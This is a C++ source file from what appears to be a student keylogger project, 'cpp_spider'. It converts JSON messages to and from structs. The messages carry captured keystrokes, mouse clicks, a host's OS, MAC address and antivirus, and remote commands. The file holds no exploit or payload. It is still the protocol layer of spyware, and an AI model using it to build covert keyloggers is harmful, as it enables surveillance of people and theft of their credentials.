//
// Serializer.cpp for cpp_spider in /home/delacr_a/rendu/CPP/cpp_spider/sources/Protocol
// 
// Made by Maxence Delacroix
// Login   <delacr_a@epitech.net>
// 
// Started on  Fri Oct  6 15:53:35 2017 Maxence Delacroix
// Last update Fri Oct  6 15:53:35 2017 Maxence Delacroix
//


#include <iostream>
#include <boost/property_tree/json_parser.hpp>
#include "logger/Logger.hpp"
#include "Protocol/Serializer.hpp"

static t_unserialized unserialize_message(boost::property_tree::ptree const &pt)
{
  t_unserialized ret;

  ret.register_ = nullptr;
  ret.mouse = nullptr;
  ret.command = nullptr;
  ret.message = new t_message;
  ret.message->timestamp = pt.get<std::string>("timestamp");
  ret.message->process = pt.get<std::string>("process");
  ret.message->data = pt.get<std::string>("data");
  ret.message->type = pt.get<std::string>("type");
  return (ret);
}

static t_unserialized unserialize_register(boost::property_tree::ptree const &pt)
{
  t_unserialized ret;

  ret.message = nullptr;
  ret.mouse = nullptr;
  ret.command = nullptr;
  ret.register_ = new t_register;
  ret.register_->os = pt.get<std::string>("os");
  ret.register_->mac = pt.get<std::string>("mac");
  ret.register_->antivirus = pt.get<std::string>("antivirus");
  return (ret);
}

static t_unserialized unserialize_mouse(boost::property_tree::ptree const &pt)
{
  t_unserialized ret;

  ret.message = nullptr;
  ret.register_ = nullptr;
  ret.command = nullptr;
  ret.mouse = new t_mouse;
  ret.mouse->timestamp = pt.get<std::string>("timestamp");
  ret.mouse->process = pt.get<std::string>("process");
  ret.mouse->keytype = spider::Serializer::getSerializer().get_keytype_from_string(pt.get<std::string>("data.click"));
  ret.mouse->x = pt.get<unsigned int>("data.x");
  ret.mouse->y = pt.get<unsigned int>("data.y");
  ret.mouse->type = pt.get<std::string>("type");
  return (ret);
}

static t_unserialized unserialize_command(boost::property_tree::ptree const &pt)
{
    t_unserialized ret;

    ret.message = nullptr;
    ret.register_ = nullptr;
    ret.mouse = nullptr;
    ret.command = new t_command;
    ret.command->type = pt.get<std::string>("type");
    ret.command->data = pt.get<std::string>("data");
    return (ret);
}

namespace spider
{

  Serializer Serializer::m_instance = Serializer();

  Serializer::Serializer()
  {
    this->unserialize_func["KEYSTROKE"] = unserialize_message;
    this->unserialize_func["REGISTER"] = unserialize_register;
    this->unserialize_func["MOUSE"] = unserialize_mouse;
    this->unserialize_func["COMMAND"] = unserialize_command;
    keytype_string[KEYTYPE::KNONE] = "KNONE";
    keytype_string[KEYTYPE::RC] = "RC";
    keytype_string[KEYTYPE::LC] = "LC";
    keytype_string[KEYTYPE::SCROLLUP] = "SCROLLUP";
    keytype_string[KEYTYPE::SCROLLDOWN] = "SCROLLDOWN";
    keytype_string[KEYTYPE::MC] = "MC";
  }

  Serializer::~Serializer()
  {
    this->unserialize_func.clear();
  }

  Serializer::Serializer(Serializer const &other)
  { static_cast<void>(other); }

  Serializer& Serializer::operator=(Serializer const &other)
  {
    static_cast<void>(other);
    return *this;
  }

  Serializer& Serializer::getSerializer() { return m_instance; }


  boost::property_tree::ptree Serializer::serialize(t_message const &data) const
  {
    boost::property_tree::ptree pt;

    pt.put("timestamp", data.timestamp);
    pt.put("process", data.process);
    pt.put("data", data.data);
    pt.put("type", data.type);
    return (pt);
  }

  boost::property_tree::ptree Serializer::serialize(t_register const &data) const
  {
    boost::property_tree::ptree pt;

    pt.put("os", data.os);
    pt.put("mac", data.mac);
    pt.put("antivirus", data.antivirus);
    return (pt);
  }

  boost::property_tree::ptree Serializer::serialize(t_mouse const &data) const
  {
    boost::property_tree::ptree pt;

    pt.put("timestamp", data.timestamp);
    pt.put("process", data.process);
    pt.put("data.click", this->get_string_from_keytype(data.keytype));
    pt.put("data.x", data.x);
    pt.put("data.y", data.y);
    pt.put("type", data.type);
    return (pt);
  }

  boost::property_tree::ptree Serializer::serialize(t_command const &data) const
  {
    boost::property_tree::ptree pt;
    logger::Logger	&logger  = logger::Logger::getLogger();

    logger.log(logger::DEBUG, "serializing data start");
    pt.put("type", data.type);
    pt.put("data", data.data);
    return (pt);
  }

  t_unserialized Serializer::unserialize(boost::property_tree::ptree const &pt)
  {
    std::string tmp;
    logger::Logger	&logger  = logger::Logger::getLogger();

    logger.log(logger::DEBUG, "unserializing data start");
    try
    {
      tmp = pt.get<std::string>("type");
    }
    catch (const boost::property_tree::ptree_error &e)
    {
      tmp = "REGISTER";
    }
    if (tmp == "MOUSE" || tmp == "KEYSTROKE" || tmp == "REGISTER")
      return (this->unserialize_func[tmp](pt));
    return (this->unserialize_func["COMMAND"](pt));
  }

  boost::property_tree::ptree Serializer::get_ptree_from_string(std::string const &json) const
  {
    boost::property_tree::ptree pt;
    std::istringstream tmp;

    tmp.str(json);
    boost::property_tree::read_json (tmp, pt);
    return (pt);
  }

  std::string const Serializer::get_string_from_ptree(boost::property_tree::ptree const &pt) const
  {
    std::ostringstream buf2;

    boost::property_tree::write_json (buf2, pt, true);
    return (buf2.str());
  }

  std::string const Serializer::get_string_from_keytype(KEYTYPE const &key) const
  { return (this->keytype_string.at(key)); }

  KEYTYPE const Serializer::get_keytype_from_string(std::string const &str) const
  {
    for (auto it : this->keytype_string)
      if (it.second == str)
	return (it.first);
    return (KEYTYPE::KNONE);
  }
}

